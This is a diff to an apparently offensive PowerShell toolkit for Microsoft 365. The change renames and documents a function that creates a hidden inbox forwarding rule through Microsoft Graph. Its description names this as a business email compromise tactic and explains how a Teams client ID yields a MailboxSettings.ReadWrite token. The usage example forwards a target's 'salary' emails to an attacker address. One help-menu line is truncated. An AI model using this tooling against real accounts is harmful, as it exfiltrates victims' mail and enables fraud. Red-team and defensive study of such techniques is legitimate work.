@@ -1444,7 +1444,7 @@ Function Get-Inbox{
     }
 }
 
-Function Invoke-CreateInboxRule {
+Function Invoke-CreateInboxForwardingRule {
     <#
     .SYNOPSIS
 
@@ -1455,7 +1455,7 @@ Function Invoke-CreateInboxRule {
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+         The `Invoke-CreateInboxForwardingRule` function creates an inbox rule that forwards emails matching a specified term to another email address. This is a documented tactic used during business email compromise (BEC) attacks. This function requires an access token with the MailboxSettings.ReadWrite scope, which is available in tokens that are requested with the Microsoft Teams client ID. Teams is in the Family of Client IDs (FOCI) so any M365 scoped refresh token may refresh into a Teams scoped access token. This function handles authentication using the Teams client ID.  
 
     .PARAMETER Tokens
 
@@ -1485,7 +1485,7 @@ Function Invoke-CreateInboxRule {
 
     .EXAMPLE
         
-        C:\PS> Invoke-CreateInboxRule -Tokens $tokens -EmailAddressName husky -RuleTerm salary -RuleName salary -EmailAddress "someevilemail@whatevs.com" -UserId "targetuser@targettenant.onmicrosoft.com"
+        C:\PS> Invoke-CreateInboxForwardingRule -Tokens $tokens -EmailAddressName husky -RuleTerm salary -RuleName salary -EmailAddress "someevilemail@whatevs.com" -UserId "targetuser@targettenant.onmicrosoft.com"
         -----------
         
     #>
@@ -1536,7 +1536,7 @@ Function Invoke-CreateInboxRule {
             if ($answer -eq "yes" -or $answer -eq "y") {
                 Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                 # Using the Teams client ID to get a token scoped to MailboSettings.ReadWrite
-                $tokens = Get-GraphTokens -ExternalCall -Client "Custom" -ClientID "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+                $tokens = Get-GraphTokens -ExternalCall -Client "Custom" -ClientID "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -Browser $Browser -Device $Device
                 $auth = "Yes"
             }
             elseif ($answer -eq "no" -or $answer -eq "n") {
@@ -1588,6 +1588,7 @@ Function Invoke-CreateInboxRule {
 
     try {
         $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $jsonData
+        Write-Host -ForegroundColor Green "[*] Forwarding rule created successfully."
         Write-Output $response
     }
     catch {
@@ -7496,6 +7497,7 @@ Invoke-SearchMailbox`t`t-`t Has the ability to do deep searches across a user’
 Invoke-SearchTeams`t`t-`t Can search all Teams messages in all channels that are readable by the current user.
 Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory
 Get-Inbox`t`t`t-`t Gets inbox items
+Invoke-CreateInboxForwardingRule`t`t`t-`t Creates a 
 Get-TeamsChat`t`t`t-`t Downloads full Teams chat conversations
     "
     Write-Host -ForegroundColor green "-------------------- Teams Modules -------------------"
